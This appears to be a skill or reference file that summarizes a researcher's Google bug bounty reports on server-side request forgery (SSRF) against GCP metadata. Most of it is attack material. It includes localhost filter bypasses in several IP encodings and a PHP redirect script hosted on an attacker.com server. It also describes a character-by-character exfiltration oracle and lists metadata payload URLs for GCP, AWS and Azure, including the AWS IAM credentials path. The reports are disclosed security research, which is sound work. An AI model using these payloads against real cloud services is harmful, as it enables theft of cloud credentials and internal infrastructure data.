---
name: bughunters-ssrf-gcp
description: Personal Google VRP reports by omespino — SSRF chains targeting GCP metadata. Blind SSRF oracle via GCP Uptime Check (0.0.0.0 bypass + redirect to [::169.254.169.254] for GCP metadata, character-by-character exfiltration via checkPassed boolean). SSRF in AMP Validator directly to 169.254.169.254 with GCP metadata parameters. Full bypass table: 0.0.0.0, octal 0177.0.0.1, decimal 2130706433, IPv4-mapped IPv6 [::169.254.169.254]. Spanish triggers — "uptime check ssrf", "gcp metadata ssrf", "amp validator ssrf", "0.0.0.0 ssrf", "169.254.169.254 gcp", "ssrf gcp", "metadata google cloud", "ssrf bypass ipv6".
---

## Reports: SSRF → GCP Metadata (omespino)

---

### Report 16 — Blind SSRF oracle via GCP Cloud Monitoring Uptime Check

**Localhost bypass:** `0.0.0.0` resolves to localhost, not in blocklist.

**TCP SSRF (boolean oracle):**
```
Protocol: TCP | Hostname: 0.0.0.0 | Port: 22
Response Content: "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10"
→ checkPassed: true = content matched (1-bit oracle)
```

**Character-by-character exfiltration:**
```python
charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.-_ "
# if checkPassed: true → add char to known; else continue
```

**Redirect chain → GCP metadata:**
```php
<?php
// 302.php on attacker server
header('Location: http://[::169.254.169.254]/computeMetadata/v1/project/project-id', TRUE, 302);
?>
```
```
Uptime Check config:
  Protocol: HTTP | Hostname: attacker.com | Path: /302.php
  Custom Headers: Metadata-Flavor: Google
```

**Bypass variants:**
| Bypass | Notes |
|---|---|
| `0.0.0.0` | Resolves to localhost, not filtered |
| `0177.0.0.1` | Octal of 127.0.0.1 |
| `2130706433` | Decimal of 127.0.0.1 |
| `[::169.254.169.254]` | IPv4-mapped IPv6, bypasses literal filter |

---

### Report 9 — SSRF in AMP Validator → GCP metadata

**Payload:**
```
http://169.254.169.254/?recursive=true&alt=text
```
**Data exposed:** instance/id, region, zone, numericProjectId, projectId, serviceAccounts email + scopes.

**Full payloads by cloud:**
```bash
# GCP
http://169.254.169.254/?recursive=true&alt=text
http://metadata.google.internal/computeMetadata/v1/?recursive=true  # + Metadata-Flavor: Google

# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # + Metadata: true
```
